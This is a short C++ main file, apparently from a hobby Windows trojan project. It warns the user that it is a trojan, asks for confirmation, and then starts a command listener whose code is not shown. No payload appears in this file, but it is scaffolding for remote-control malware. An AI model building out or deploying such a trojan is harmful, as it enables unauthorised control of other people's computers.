#pragma comment(lib, "Ws2_32.lib")

#include <WinSock2.h>
#include <Winuser.h>
#include <iostream>
#include <thread>
#include <string>
#include <cstdio>
#include <memory>
#include <stdexcept>
#include <string>
#include <vector>
#include <array>

#include "ThreadPool.h"
#include "StopAllThreads.h"
// #include "RandomMouse.h"
#include "CommandListener.h"

using namespace std;

int main()
{
  string confirm;

  CommandListener listener;

  cout << "[WARNING] This is a trojan. Do u really want to start? [Y] or [N]" << endl;
  cin >> confirm;

  if (confirm == "N") {
    exit(1);
  } else {
      listener.startListening();
  }
  return 0;
}
